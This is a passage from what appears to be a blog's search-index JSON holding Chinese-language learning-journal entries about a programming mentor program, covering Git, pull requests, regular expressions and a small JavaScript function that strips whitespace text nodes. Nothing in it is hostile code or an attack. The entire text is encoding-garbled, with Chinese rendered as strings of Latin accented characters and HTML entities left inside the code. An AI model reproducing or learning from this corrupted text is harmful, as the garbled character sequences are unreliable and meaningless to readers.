çš„æ©Ÿæœƒéƒ½è »å°‘çš„ï¼Œæ‰€ä»¥å°±ä¸€ç›´æŠŠ Conflict é€™å€‹éƒ¨åˆ†çµ¦ä¸Ÿåœ¨ä¸€æ—äº†ã€‚ åœ¨ä»Šå¤©é‡æ–°è¤‡ç¿’åˆ†æ”¯èˆ‡è¡çªçš„è§€å¿µå¾Œï¼Œæˆ‘æƒ³æ¥ä¸‹ä¾†çš„æ—¥å­æˆ‘æœƒé–‹å§‹é¤Šæˆç”¨ Git çš„ç¿’æ…£å§ã€‚é‚„æ˜¯é‚£å¥è€è©±ï¼Œå·¥å…·æ˜¯ç”¨ä¾†æŠŠä¸€äº›äº‹æƒ…çµ¦å¼„å¾—æ›´è¼•é¬†ï¼Œè€Œä¸æ˜¯ç”¨ä¾†æ‹–äººå¾Œè…¿çš„ã€‚ é¡Œå¤–è©±ä»Šå¤©è·Ÿå¥³æœ‹å‹å‡ºå»æ•£æ­¥æ™‚èŠäº†å¾ˆå¤šï¼Œå…¶ä¸­æœ‰ä¸€ä»¶äº‹æƒ…é‚„è »æœ‰è¶£çš„ï¼Œæ‰€ä»¥æˆ‘æƒ³è¨˜éŒ„ä¸‹ä¾†ã€‚ æœ‰ä¸€æ®µè«‡è©±æ˜¯åœ¨è¨è«–æˆ‘ å­¸ç¿’è¨ˆç•« ä¸­çš„å…§å®¹ï¼š é¦–å…ˆï¼Œé€™ä»½å­¸ç¿’è¨ˆç•«ä¸»è¦æ˜¯åƒè€ƒ ç¨‹å¼å°å¸«å¯¦é©—è¨ˆç•«ç¬¬äº”æœŸ æä¾›çš„èª²ç¶±ï¼Œä»¥åŠ Lidemy é‹°å­¸é™¢ ä¸Šæ‰€æä¾›çš„èª²ç¨‹ä½œç‚ºå­¸ç¿’æ•™æã€‚æˆ‘ä¸¦ä¸æ˜¯è©²è¨ˆç•«ä¸­çš„å­¸ç”Ÿï¼Œåªæ˜¯åœ¨è¿‘æ—¥é«”æœƒåˆ°è‡ªå·±åœ¨å‰ç«¯é€™å€‹é ˜åŸŸé‚„æœ‰å¾ˆå¤šæ±è¥¿æ²’æœ‰æ‘¸é€ï¼Œæ‰€ä»¥æ±ºå®šç‚ºè‡ªå·±åšä¸€ä»½æ–°çš„å­¸ç¿’è¨ˆç•«ï¼Œé‡æ–°å¥½å¥½å­¸ç¿’ã€‚å¸Œæœ›åœ¨å®Œæˆé€™ä»½è¨ˆç•«å¾Œï¼Œè‡ªå·±èƒ½å¤ æŠŠèº«ç‚ºä¸€å€‹å‰ç«¯è©²çŸ¥é“çš„æ‰€æœ‰çŸ¥è­˜éƒ½çµ¦ç†è§£é€å¾¹ã€‚æˆ‘å­¸ç¿’å‰ç«¯å…¶å¯¦å·²ç¶“æœ‰ä¸€æ®µæ™‚é–“äº†ï¼Œæ‰€ä»¥é€™å€‹è¨ˆç•«æœƒä¾è‡ªå·±çš„éœ€æ±‚ä¾†åšèª¿æ•´ï¼ŒæŠŠä¸€äº›æˆ‘å·²ç¶“äº†è§£çš„éƒ¨åˆ†çµ¦çœç•¥æ‰ï¼Œæˆ–è€…æ˜¯å¿«é€Ÿè¤‡ç¿’å¸¶éï¼Œä¸¦ä¸æœƒå®Œå…¨å¾é›¶é–‹å§‹å­¸ç¿’ã€‚ï¼ˆé›–ç„¶æˆ‘å¯«å®Œå¾Œæ‰ç™¼ç¾å…¶å¯¦æ²’å·®å¤šå°‘ï¼‰å¦å¤–ä¹Ÿå¾ˆè¬è¬ç¨‹å¼å°å¸«è¨ˆç•«çš„ä½œè€… Huliï¼Œæä¾›äº†éå¸¸è©³ç´°çš„èª²ç¶±ã€‚æˆ‘æ˜¯å€‹å¾ˆä¸æœƒå®‰æ’è·Ÿè¦åŠƒçš„äººï¼Œæ‰€ä»¥èƒ½æœ‰é€™æ¨£å®Œæ•´çš„åƒè€ƒæ–¹å‘ï¼ŒçœŸçš„å¹«åŠ©äº†æˆ‘è¨±å¤šï¼Œååˆ†æ„Ÿè¬ã€‚é‚£éº¼ï¼Œè®“æˆ‘å€‘ä¸€èµ·æœŸå¾…é€™ä»½å­¸ç¿’è¨ˆç•«èƒ½å¤ é †åˆ©å®Œæˆå§ï¼ æˆ‘å¥³æœ‹å‹ä¸€é–‹å§‹è·Ÿæˆ‘èªªã€Œä½ åœ¨å…§å®¹èªªã€æˆ‘æ˜¯å€‹å¾ˆä¸æœƒå®‰æ’è·Ÿè¦åŠƒçš„äººï¼Œæ‰€ä»¥èƒ½æœ‰é€™æ¨£å®Œæ•´çš„åƒè€ƒæ–¹å‘ï¼ŒçœŸçš„å¹«åŠ©äº†æˆ‘è¨±å¤šï¼Œååˆ†æ„Ÿè¬ã€ï¼Œé€™æ¨£æœƒè®“äººæ„Ÿè¦ºä½ æ˜¯ä¸æ˜¯å¾ˆä¸æœƒå®‰æ’æˆ–è¦åŠƒé˜¿ï¼Ÿã€ æˆ‘ä¹Ÿæå‡ºäº†è‡ªå·±çš„çœ‹æ³•ï¼šã€Œå¯æ˜¯ï¼Œæˆ‘çš„è©±æœƒè¦ºå¾—é€™å€‹äººè‡³å°‘çŸ¥é“è‡ªå·±çš„å•é¡Œï¼Œç„¶å¾Œä»–ä¹Ÿè©¦è‘—æƒ³è¦åšé»æ”¹å–„ï¼Œä½ ä¸æœƒå—ï¼Ÿã€ å…¶å¯¦æ¯å€‹äººçš„çœ‹å¾…ä¸€ä»¶äº‹æƒ…çš„æƒ³æ³•æœ¬ä¾†å°±æœƒä¸ä¸€æ¨£ï¼Œæœ‰äº›äººå¯èƒ½æœƒè·Ÿæˆ‘å¥³æœ‹å‹çš„çœ‹æ³•ä¸€æ¨£ï¼Œä¹Ÿæœ‰äº›äººå¯èƒ½æœƒè·Ÿæˆ‘çš„çœ‹æ³•ä¸€æ¨£ï¼Œå…¶å¯¦å…©ç¨®éƒ½æ²’æœ‰å°æˆ–éŒ¯ï¼Œåªæ˜¯å°±æ¯å€‹äººæœ‰è‡ªå·±çš„æƒ³æ³•å§ã€‚ ä½†æ¯”è¼ƒæœ‰è¶£çš„å…¶å¯¦æ˜¯å¦å¤–ä¸€ä»¶äº‹ã€‚ æˆ‘åœ¨å›ç­”å®Œæˆ‘å¥³æœ‹å‹å¾Œï¼Œæˆ‘æ€è€ƒäº†ä¸€ä»¶äº‹ï¼šç‚ºä»€éº¼æˆ‘ç•¶åˆæœƒå¯«è‡ªå·±å¾ˆä¸æœƒå®‰æ’çš„é€™ä»¶äº‹æƒ…ï¼Ÿ é€™æ™‚å€™ä¸€å¥è©±çªç„¶å¾æˆ‘å˜´è£¡è„«å£è€Œå‡ºï¼šã€Œå…¶å¯¦æˆ‘åªæ˜¯å› ç‚ºæƒ³è¬è¬ Huliï¼Œæ‰€ä»¥æ‰é€™æ¨£å¯«ã€‚ã€ é “æ™‚ï¼Œæˆ‘å€‘å…©å€‹å¥½åƒéƒ½é ˜æ‚Ÿäº†ä¸€ä»¶äº‹ï¼šåŸä¾†æ˜¯æˆ‘å€‘æƒ³å‚³é”çš„å°è±¡ä¸åŒ æ²’éŒ¯ï¼Œæˆ‘å¥³æœ‹å‹æƒ³å‚³é”çš„å°è±¡æ˜¯å…¬å¸çš„äººè³‡ï¼Œå› ç‚ºæˆ‘æœ€è¿‘æ­£åœ¨æ‰¾å·¥ä½œï¼Œæ‰€ä»¥å¥¹æ“”å¿ƒäººè³‡å¦‚æœçœ‹åˆ°æˆ‘å¯«äº†é€™æ¨£çš„æ±è¥¿æœƒæœ‰ä»€éº¼æ¨£çš„æƒ³æ³•ï¼Ÿ ä½†æˆ‘ä¸¦æ²’æœ‰è€ƒæ…®é€™å€‹å•é¡Œï¼Œå› ç‚ºæˆ‘æƒ³å‚³é”çš„å°è±¡æ˜¯ Huiï¼Œæˆ‘æƒ³å‚³é”çš„æ˜¯æˆ‘å¾ˆæ„Ÿè¬ä»–æä¾›é€™ä»½èª²ç¶±çš„è¨Šæ¯ã€‚ æ‰€ä»¥ä»Šå¤©ä¸åªå­¸åˆ°äº†é—œæ–¼ Git çš„ä¸€äº›çŸ¥è­˜ï¼Œæˆ‘ä¹Ÿå­¸åˆ°äº†å¦ä¸€ä»¶äº‹ï¼šä¸€æ®µè¨Šæ¯æœƒå› ç‚ºä½ æƒ³å‚³é”çš„å°è±¡ä¸åŒï¼Œè€Œæœ‰ä¸åŒçš„è§£è®€æ–¹å¼ã€‚ æœŸè¨±æ˜å¤©å°±æ˜¯å­¸ç¿’è¨ˆç•«æ­£å¼åŸ·è¡Œçš„æ™‚é–“äº†ï¼ˆé€™å…©å¤©åªæ˜¯æˆ‘å·è·‘ï¼Œå› ç‚ºæˆ‘æ€•æˆ‘é€²åº¦è·Ÿä¸ä¸Šï¼‰ï¼Œå¸Œæœ›åœ¨æ¥ä¸‹ä¾†çš„æ—¥å­ä¸­å¯ä»¥ä¸€åˆ‡é †åˆ©ã€‚ æ˜å¤©çš„è¨ˆç•«æ˜¯æŠŠ Git çš„éƒ¨åˆ†çœ‹å®Œï¼Œç„¶å¾Œå¯ä»¥çš„è©±é–‹å§‹æŠŠä½œæ¥­å®Œæˆä¸€äº›ï¼Œå¤§æ¦‚å°±æ˜¯é€™æ¨£å§ã€‚","link":"/2021/12/12/mentor-program-day02/"},{"title":"mentor-program-day03","text":"yo ï½åˆ°äº†ç¬¬ä¸‰å¤©ï¼Œé›–ç„¶æœ‰é»æ‡¶ï¼Œä½†é‚„æ˜¯ä¾†ä¹–ä¹–åšå€‹ç´€éŒ„ã€‚ é€²åº¦ä»Šå¤©æŠŠ Git çš„éƒ¨åˆ†çµ¦çœ‹å®Œäº†ï¼Œä¹Ÿåšäº†ç­†è¨˜ï¼š Git hook Git æŒ‡ä»¤ ä½¿ç”¨ Git é ç«¯åŠŸèƒ½æ™‚å¯èƒ½æœƒç¢°åˆ°çš„å•é¡Œ Git bash ä¸Šçš„å¿«æ·éµ clone è·Ÿ fork çš„å·®ç•° GitHub çš„ä¸€äº›åŸºæœ¬åŠŸèƒ½ Git ä¸­çš„ç‹€æ³åŠ‡ GitHub çš„ä¸€äº›å°çŸ¥è­˜ æˆ‘æƒ³è¦ç™¼ pull request åˆ°åˆ¥äººçš„å°ˆæ¡ˆè¦æ€éº¼åšï¼Ÿ å…¶å¯¦ä»¥å‰å°±æƒ³åƒé€™æ¨£åšä¸€å¤§å †çš„ç­†è¨˜äº†ï¼Œåªæ˜¯ä»¥å‰å¯«æ–‡ç« æœƒå¤ªç³¾çµå¾ˆå¤šäº‹æƒ…ï¼Œå°è‡´å¯«ä¸€ç¯‡æ–‡ç« éƒ½è¦èŠ±ä¸€å¤§å †æ™‚é–“æƒ³é€™å€‹æƒ³é‚£å€‹çš„ã€‚ç¾åœ¨å›æƒ³èµ·ä¾†é‚„çœŸæ˜¯è »ä¸å€¼å¾—çš„ã€‚ é›–ç„¶æ²’æœ‰é”åˆ°é æœŸçš„ç›®æ¨™ï¼ˆçœ‹å®Œå½±ç‰‡ + åšä½œæ¥­ï¼‰ï¼Œä½†æ„Ÿè¦ºæœ‰æ…¢æ…¢é€²å…¥æ­¥èª¿äº†ï¼Œæ‡‰è©²èƒ½è¶Šä¾†è¶Šé †åˆ©èµ°ä¸‹å»ã€‚ å­¸åˆ°çš„äº‹æƒ…å¦‚æœæˆ‘æ²’è¨˜éŒ¯çš„è©±ï¼Œæ˜¨å¤©ä¸»è¦æ˜¯åœ¨å­¸ã€Œåˆ†æ”¯ã€çš„æ±è¥¿å§ï¼Œæ‰€ä»¥ä»Šå¤©å¤§éƒ¨åˆ†åœ¨å­¸ã€Œé ç«¯ã€çš„äº‹æƒ…ã€‚ ä»Šå¤©ä¾ç„¶æ˜¯æ”¶ç©«æ»¿æ»¿ï¼Œå¾ˆå¤šä»¥å‰ä¼¼æ‡‚éæ‡‚çš„æ±è¥¿éƒ½ææ¸…æ¥šäº†ï¼Œåƒæ˜¯ã€Œpull è·Ÿ pushã€ã€ã€Œæ€éº¼ç™¼ pull requestã€ã€ã€Œclone è·Ÿ fork çš„å·®åˆ¥ã€ç­‰ç­‰ã€‚ åœ¨ç†è§£é€™äº›æ±è¥¿çš„ç”¨é€”å¾Œï¼Œå…¶å¯¦ä¹Ÿä¸æœƒå†åƒä»¥å‰ä¸€æ¨£è¦ºå¾—æ€éº¼é‚£éº¼è¤‡é›œï¼Œæ€éº¼é‚£éº¼å¤šæ±è¥¿è¦è¨˜çš„æ„Ÿè¦ºã€‚ é™¤äº† Git çš„å…§å®¹ä¹‹å¤–ï¼Œæˆ‘ä¹Ÿå­¸åˆ°å…¶å¯¦è¦æŠŠå­¸ç¿’æ™‚å¯ä»¥è©¦è‘—æŠŠç„¦é»æ”¾åœ¨ã€Œæ¯”è¼ƒé‡è¦ã€çš„é‚£äº›éƒ¨åˆ†ã€‚ä»¥ Git ä¾†èˆ‰ä¾‹çš„è©±ï¼Œå°±åƒ Git æŒ‡ä»¤ ä¸­çš„æåˆ°çš„æŒ‡ä»¤å…¶å¯¦å°±è¶³ä»¥æ‡‰ä»˜å¤§éƒ¨åˆ†çš„æƒ…å¢ƒã€‚å¯æ˜¯å¦‚æœä½ æƒ³è¦å®Œå…¨æŠŠ Git çµ¦å¼„çš„ä¸€æ¸…äºŒæ¥šï¼Œé‚£ä½ å¯èƒ½å°±è¦å¤šå­¸å¾ˆå¤šæŒ‡ä»¤ï¼Œåƒæ˜¯ git cherry-pickã€git rebase ç­‰ç­‰ä¹‹é¡çš„ã€‚ é¡Œå¤–è©±æ˜¨å¤©çœ‹äº†é¬¼æ»…ä¹‹åˆƒæ²¹é‹ç¯‡çš„ç¬¬äºŒé›†ï¼Œè¦ºå¾—å‹•ç•«å…¬å¸çœŸçš„å¾ˆæœƒåŠäººèƒƒå£ï¼Œæ€éº¼éƒ½å‰›å¥½æŒ‘é‚£éº¼ç²¾å½©çš„éƒ¨åˆ†çµæŸã€‚å®³æˆ‘æ¯å€‹ç¦®æ‹œçœ‹çš„æ™‚å€™éƒ½æå¾—ç·Šå¼µå…®å…®çš„ï¼Œä¸çŸ¥é“ä»€éº¼æ™‚å€™çªç„¶å°±æœƒè¢«åˆ‡ ED ä¸€æ¨£ã€‚ é›–ç„¶èªªé€™å€‹è¨ˆç•«è¦é è¨ˆè¦è·‘å…­å€‹æœˆæ‰æœƒè·‘å®Œï¼Œä½†é‚„æ˜¯å¸Œæœ›èƒ½è¶•å¿«è·‘å®Œå‘€ï¼Œä¸æƒ³æ¯æ¬¡é¢è©¦éƒ½è¢«æ´—è‡‰ï¼Œæ¯æ¬¡éƒ½è¦å¹«è‡ªå·± QQã€‚ æ—¢ç„¶æœ‰æåˆ°é¬¼æ»…ï¼Œé‚£å°±é †ä¾¿åˆ†äº«ä¸€ä¸‹ Aimer å”±çš„ä¸»é¡Œæ›²å§ï¼šæ®‹éŸ¿æ•£æ­Œ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ HW1 çš„ä½œæ¥­çµ¦åšå®Œï¼Œç„¶å¾Œå¿«é€Ÿé€²åˆ°ä¸‹å€‹çš„éšæ®µçš„è¨ˆç•«ã€‚","link":"/2021/12/14/mentor-program-day03/"},{"title":"mentor-program-day05","text":"è¦ºå¾—æ˜å¤©å¾—å¥½å¥½è¶•é€²åº¦çš„ç¬¬äº”å¤© é€²åº¦ä»Šå¤©èŠ±äº†å¤§æ¦‚å…©å€‹å°æ™‚çš„æ™‚é–“åšäº†ä¸€é–“å…¬å¸çš„ç·šä¸Šæ¸¬è©¦é¡Œç›®ï¼Œå…ˆæ”¾å¼µåœ–å¹«è‡ªå·± QQï¼š ï¼ˆå¸Œæœ›åå¹´å¾Œçš„æˆ‘æœƒæ‡·å¿µå¼±å¼±çš„è‡ªå·±ï¼‰ å…¶å¯¦å…‰ç¬¬äºŒé¡Œå°±å¡äº†æˆ‘å¤§æ¦‚ä¸€å°æ™‚çš„æ™‚é–“ã€‚é€™é¡Œä¸»è¦æ˜¯è¦è€ƒç”¨ JS ä¾†çˆ¬ DOM ç¯€é»çš„èƒ½åŠ›ï¼Œä¸éæˆ‘å¤ªä¹…æ²’ç¢°æ‰€ä»¥èŠ±äº†å¾ˆå¤šæ™‚é–“ï¼Œçµæœé‚„æ˜¯æ²’ç ”ç©¶å‡ºä¾†ã€‚ åœ¨åšå®Œæ¸¬é©—å¾Œï¼Œæˆ‘ä¸Šç¶²åšäº†ä¸€äº›ç ”ç©¶ï¼Œç™¼ç¾æœ‰äººçš„åšæ³•æ˜¯å¯«ä¸€å€‹å‡½å¼ä¾†æŠŠ DOM ç¯€é»çš„ç©ºç™½å­—å…ƒï¼ˆæ–‡å­—ç¯€é»ï¼‰çµ¦éæ¿¾æ‰çš„æ–¹å¼ï¼š 12345678910function cleanWhitespace(oEelement) { for (var i = 0; i &lt; oEelement.childNodes.length; i++) { var node = oEelement.childNodes[i] // noeeType3 = æ–‡å­—ç¯€é» and ç©ºç™½å­—å…ƒ if (node.nodeType == 3 &amp;&amp; !/\\S/.test(node.nodeValue)) { // ç æ‰å­ç¯€é» node.parentNode.removeChild(node) } }} å…¶å¯¦å°±æ˜¯å‰›å¥½çœ‹åˆ°è£¡é¢çš„ /\\s/ï¼Œå†åŠ ä¸Šå‰å¹¾é–“é¢è©¦çš„å…¬å¸å‰›å¥½åˆè€ƒåˆ°æ­£å‰‡è¡¨é”å¼ï¼Œå°±æœ‰è‚¡æƒ³è¦è·Ÿå®ƒåšå€‹äº†çµçš„è¡å‹•ï¼Œæ–¼æ˜¯å°±åˆèŠ±äº†ä¸€å€‹ä¸‹åˆçš„æ™‚é–“ä¾†ç ”ç©¶ï¼Œä¹Ÿå¯«äº†ä¸€é»ç­†è¨˜ï¼š æ­£å‰‡è¡¨é”å¼ æ­£å‰‡è¡¨é”å¼çš„å¯¦æˆ°æ¼”ç·´ ä¸éè©²åšçš„é‚„æ˜¯è¦åšï¼Œä»Šå¤©é›–ç„¶é€²åº¦å°‘ï¼Œä½†ä¹Ÿæ˜¯æŠŠ hw5 çµ¦åšå®Œäº†ã€‚ çœ‹éå»çš„åŒå­¸çš„ä½œæ¥­å­¸åˆ°äº†è »å¤šäº‹æƒ…ï¼Œä¹Ÿç™¼ç¾æœ‰äº›äººçš„å­¸ç¿’èƒŒæ™¯å¾ˆæœ‰è¶£ã€‚è¨˜å¾—æœ‰ä¸€ä½èªªä»–å­¸äº†æŸå€‹ CLI çš„æŒ‡ä»¤æ˜¯ç‚ºäº†å·ç©é›»è…¦ XDï¼Œçœ‹ä¾†å¤§å®¶å¾å°å°±æœ‰ç•¶é§­å®¢çš„æ½›åŠ›å•Šã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å­¸åˆ°æœ€å¤šçš„å°±æ˜¯æ­£å‰‡è¡¨é”å¼å§ï¼Œä»¥å‰éƒ½è¦ºå¾—é‚£æ˜¯å¯«çµ¦å¦–é­”é¬¼æ€ªçœ‹çš„æ±è¥¿ï¼ˆå› ç‚ºä»–é•·å¾—å¾ˆå¯æ€•ï¼‰ã€‚å°±ç®—çŸ¥é“é‚£æ˜¯ä¸€å€‹å¯ä»¥å¹«åŠ©è§£é¡Œçš„å·¥å…·ï¼Œä½†æ²’æœ‰å¯¦éš›è‡ªå·±å»æ’éç‰†ï¼Œå°±ä¸çŸ¥é“ç‚ºä»€éº¼è¦å­¸é‚£äº›æ–°æ±è¥¿ã€‚åƒæ˜¯åœ¨ æ­£å‰‡è¡¨é”å¼çš„å¯¦æˆ°æ¼”ç·´ ä¸­çš„é¡Œç›®ï¼Œå¦‚æœä¸ç”¨æ­£å‰‡è¡¨é”å¼ä¾†è§£é¡Œçš„è©±ï¼Œä¹Ÿè¨±å¾—ç”¨å¾ˆç¹é›œçš„æ­¥é©Ÿæ‰æœ‰è¾¦æ³•é”æˆã€‚ å­¸å®Œå¾Œé‚„è »é–‹å¿ƒçš„ï¼Œæœªä¾†å¦‚æœç¢°åˆ°é¡ä¼¼çš„æ–‡å­—é›£é¡Œï¼Œæˆ‘æƒ³æˆ‘æ‡‰è©²èƒ½å¤ å¥½å¥½åˆ©ç”¨é€™å€‹å·¥å…·ï¼Œä¸ç”¨å†åƒåŸæœ¬é‚£æ¨£ç”¨å…§å»ºæ–¹æ³•ä¾†è™•ç†è³‡æ–™ã€‚ä¹Ÿæ…¶å¹¸è‡ªå·±æœ‰åšé€™äº›ç­†è¨˜ï¼Œå°±ç®—çœŸçš„å¿˜è¨˜äº†ä¹Ÿéƒ½èƒ½éš¨æ™‚ä¾†å›æº«ã€‚ ç¾åœ¨é›–ç„¶æ‰éäº”å¤©ï¼Œä½†åœ¨é€™äº”å¤©æˆ‘å¯«äº†å¥½å¤šæ±è¥¿ï¼Œä¹Ÿå¾å¯«æ±è¥¿é€™ä»¶äº‹å¾—åˆ°äº†ä¸€é»æ„Ÿæƒ³ã€‚é›–ç„¶ä¸çŸ¥é“é€™è·Ÿå¯«æ±è¥¿æœ‰æ²’æœ‰é—œä¿‚ï¼Œä½†æ˜¯ç¾åœ¨æœƒç‚ºäº†æƒ³æŠŠç­†è¨˜åšçš„å®Œæ•´ï¼Œæ‰€ä»¥åœ¨å­¸ç¿’çš„æ™‚å€™è®Šå¾—å¾ˆå¸¸å»åšç¯„ä¾‹ï¼Œè¦ºå¾—åšç¯„ä¾‹å¯ä»¥æ›´åŠ çš„ç†è§£ä¸€å€‹æ¦‚å¿µã€‚ ç¸½ä¹‹ï¼Œä¸ç®¡åœ¨å­¸ä»€éº¼æ–°æ±è¥¿ï¼Œç›´æ¥åšé¡Œç›®çš„å­¸ç¿’æ•ˆæœæˆ‘è¦ºå¾—æ˜¯å¾ˆæœ‰å¹«åŠ©çš„ã€‚ é¡Œå¤–è©±æœ€è¿‘åœ¨çœ‹çš„æ›¸æ˜¯ã€ŒThe power of habitã€ï¼Œæœ‰ä»¶äº‹æƒ…æˆ‘è¦ºå¾—éå¸¸çš„æœ‰æ„æ€ã€‚ æ›¸ä¸­æåˆ°äººå€‘æœƒæ’æ–¥è‡ªå·±ä¸ç†Ÿæ‚‰ï¼ˆä¸ç¿’æ…£ï¼‰çš„æ±è¥¿ï¼Œåƒæ˜¯å¦‚æœçªç„¶è¦ä½ åƒä¸€å€‹ä½ å¾ˆé™Œç”Ÿçš„é£Ÿç‰©ï¼Œä½ å¤šåŠæœƒå¾ˆæ’æ–¥ã€‚ä½†æ˜¯å¦‚æœç”¨ä½ ç†Ÿæ‚‰çš„æ–¹å¼ä¾†çƒ¹èª¿é€™å€‹é£Ÿç‰©ï¼Œä½ å¯èƒ½å°±æœƒæœ‰è »å¤§çš„æ©Ÿç‡åƒä¸‹å®ƒã€‚ æœ‰ä¸€å€‹å¾ˆç¶“å…¸çš„è©±æ˜¯ï¼š ç”¨èˆŠç¿’æ…£åŒ…è£æ–°æ±è¥¿ï¼Œå¤§å®¶å°±æœƒæ¯”è¼ƒå®¹æ˜“æ¥å—ã€‚ æœ‰ä¸€å€‹å¾ˆç‰¹åˆ¥çš„ä¾‹å­æ˜¯ Outkast - Hey Ya! é€™é¦–æ­Œã€‚ é€™é¦–æ­Œåœ¨ä¸€é–‹å§‹å¤§å®¶éƒ½è¦ºå¾—å¾ˆé›£è½ï¼ˆåƒ…ç®¡æŸå€‹ç¨‹å¼çš„è¨ˆç®—çµæœå‘Šè¨´é›»å°é€™é¦–æ­Œå°‡æœƒçˆ†ç´…ï¼‰ï¼Œä½†æ˜¯ç•¶é›»å°æŠŠé€™é¦–æ­Œå¤¾åœ¨é¡ä¼¼çš„å¤¯æ­Œä¹‹é–“æ’­æ”¾å¾Œï¼Œå¤§å®¶é€æ¼¸æ„›ä¸Šäº†é€™é¦–æ­Œï¼Œæœ€å¾Œé‚„å¾—äº†è‘›èŠç¾çï¼ŒçœŸçš„æ˜¯å¤ªçäº†ï¼ é€™åˆè®“æˆ‘æƒ³èµ·ï¼Œå¥³æœ‹å‹å¸¸è·Ÿæˆ‘èªªäººæ˜¯å€‹å¾ˆç°¡å–®çš„ç”Ÿç‰©é€™å›äº‹(ã£ â—Ï‰â—)ã£ æœŸè¨±æ˜å¤©æƒ³é–‹å§‹å­¸ä¸‹å‘¨çš„é€²åº¦ï¼Œç„¶å¾Œé‚Šåˆ©ç”¨æ™‚é–“ä¾†ç ”ç©¶ week1 çš„æŒ‘æˆ°é¡Œï¼Œå¸Œæœ›å…©ä»¶äº‹æƒ…éƒ½å¯ä»¥åšå¥½ QQã€‚","link":"/2021/12/16/mentor-program-day05/"},{"title":"mentor-program-day04","text":"é¢¨å¹³æµªéœçš„ç¬¬å››å¤©ã€‚ é€²åº¦ä»Šå¤©åšäº† week1 çš„ä½œæ¥­ã€‚æœ¬ä¾†ä»¥ç‚ºèƒ½å¾ˆé †åˆ©å®Œæˆï¼Œä½†çµæœåªå®Œæˆäº†ä¸‰å€‹ï¼š hw1 hw3 hw4 å¦å¤–ä¹Ÿåšäº†å¹¾å€‹æ–°çš„ç­†è¨˜è·Ÿæ›´æ–°ï¼š Commandline çš„æŒ‡ä»¤VS-Code ä¸€äº›å¯¦ç”¨çš„å¿«æ·éµæˆ‘æƒ³è¦ç™¼ pull request åˆ°åˆ¥äººçš„å°ˆæ¡ˆè¦æ€éº¼åšï¼Ÿ ä¸»è¦æ˜¯èŠ±äº†æ¯”è¼ƒå¤šæ™‚é–“ç ”ç©¶äº¤ä½œæ¥­çš„æµç¨‹ï¼Œé‚„æœ‰å¯«æ•™å­¸æ–‡èŠ±äº†æ¯”è¼ƒå¤šæ™‚é–“ã€‚ å­¸åˆ°çš„äº‹æƒ…æœ‰å¥½ä¸€é™£å­æ²’æœ‰åƒé€™æ¨£å­å¯«æ•™å­¸æ–‡äº†ï¼Œè‡ªå¾æˆ‘é–‹å§‹å¯«ç­†è¨˜è€Œä¸æ˜¯æ–‡ç« å¾Œæ‰é«”æœƒåˆ°ï¼Œå¯«æ•™å­¸æ–‡è·Ÿåšç­†è¨˜å…¶å¯¦æ˜¯å…©ä»¶ä¸åŒçš„äº‹ã€‚ å¯«çµ¦è‡ªå·±çœ‹çš„ç­†è¨˜å¯ä»¥å¾ˆæ¸…æ¥šè©²å¯«ä»€éº¼ï¼Œåªè¦æŠŠè‡ªå·±ä¸æ¸…æ¥šçš„éƒ¨åˆ†å¯«ä¸‹ä¾†å°±å¯ä»¥äº†ã€‚ä½†æ•™å­¸æ–‡ä¸¦ä¸æ˜¯é€™æ¨£ï¼Œä½ å¾—è€ƒæ…®å°æ–¹èƒ½ä¸èƒ½ç†è§£ï¼Ÿå°æ–¹çš„ç¨‹åº¦æ˜¯æ€éº¼æ¨£ï¼Ÿæ€éº¼æ¨£æ‰èƒ½è®“å°æ–¹æ¯”è¼ƒæ¸…æ¥šï¼Ÿ ä½ å¾—å…ˆç«™åœ¨å°æ–¹çš„è§’åº¦ä¾†æ€è€ƒæ¯ä¸€ä»¶äº‹ï¼Œæ‰çŸ¥é“å¤§æ¦‚æ€éº¼å»ä¸‹ç­†ï¼Œè€Œä¸æ˜¯å®Œå…¨ä»¥ä½ è‡ªå·±çš„æƒ³æ³•ä¸‹å»æç¹ªã€‚ å…¶å¯¦æˆ‘æ—©æœŸçš„æ–‡ç« å°±æ˜¯ä»¥æ•™å­¸æ–‡çš„æ–¹å¼ä¾†æ’°å¯«ï¼Œåƒæ˜¯ ä¸€æ­¥ä¸€æ­¥èªè­˜ Gridã€åœ¨å­¸éŸ¿æ‡‰å¼è¨­è¨ˆå‰ï¼Œä½ æ‡‰è©²å…ˆçŸ¥é“é€™äº›ã€‚ã€æ•¸å­—ç³»çµ±ä¸¦æ²’æœ‰ä½ æƒ³çš„é‚£éº¼è¤‡é›œ éƒ½æ˜¯é€™æ¨£çš„é¢¨æ ¼ã€‚ ç¸½ä¹‹ï¼Œæˆ‘è¦ºå¾—ç•¶è€å¸«çœŸçš„æ˜¯ä»¶ä¸å®¹æ˜“çš„äº‹æƒ…ã€‚ é‚„æœ‰å¦å¤–ä¸€ä»¶äº‹æƒ…ä¹Ÿè®“äººæ„Ÿè§¸è »æ·±çš„ï¼Œå°±æ˜¯ã€ŒæŠŠä½ æ‰€å­¸çš„çŸ¥è­˜çµ¦å¯¦éš›æ‡‰ç”¨ã€é€™ä»¶äº‹ã€‚ æˆ‘æœ¬ä¾†ä»¥ç‚ºçœ‹å®Œå½±ç‰‡å­¸å®Œ Git çš„æˆ‘æ‡‰è©²åœ¨æ“ä½œ Git æ‡‰è©²ä¸æœƒæœ‰ä»€éº¼å•é¡Œï¼Œä½†æ˜¯ç›´åˆ°å¯« hw1 çš„æ™‚å€™æˆ‘å°±ç™¼ç¾æˆ‘éŒ¯äº†ã€‚æˆ‘ç¢ºå¯¦åœ¨èª²ç¨‹ä¸­å­¸åˆ° Git é ç«¯æ“ä½œçš„ä¸€äº›çŸ¥è­˜ï¼Œé‚„æœ‰ pull request çš„æµç¨‹ï¼Œä½†æ˜¯æˆ‘æ²’æœ‰å¯¦ä½œéã€‚åˆ°äº†é€™å€‹æ™‚å€™æˆ‘æ‰æ„è­˜åˆ°ã€Œåªæ˜¯ç†è§£é‚„ä¸å¤ ã€é€™ä»¶äº‹ã€‚ ç‚ºäº†è®“è‡ªå·±å¼„æ¸…æ¥š pull request çš„æµç¨‹ï¼Œæˆ‘çœ‹äº†éå»çš„å­¸ç”Ÿèˆ‡åŠ©æ•™çš„äº’å‹•éç¨‹ï¼Œæ¥è‘—åˆä¸€æ­¥ä¸€æ­¥è‡ªå·±æŒ‰ç…§ä¸Šèª²æåˆ°çš„æµç¨‹å¯¦éš›è‡ªå·±èµ°éä¸€éï¼Œæœ€å¾Œæ‰çœŸçš„å¼„æ¸…æ¥šæ•´å€‹ä¾†é¾å»è„ˆã€‚ ä¸ç®¡ä½ 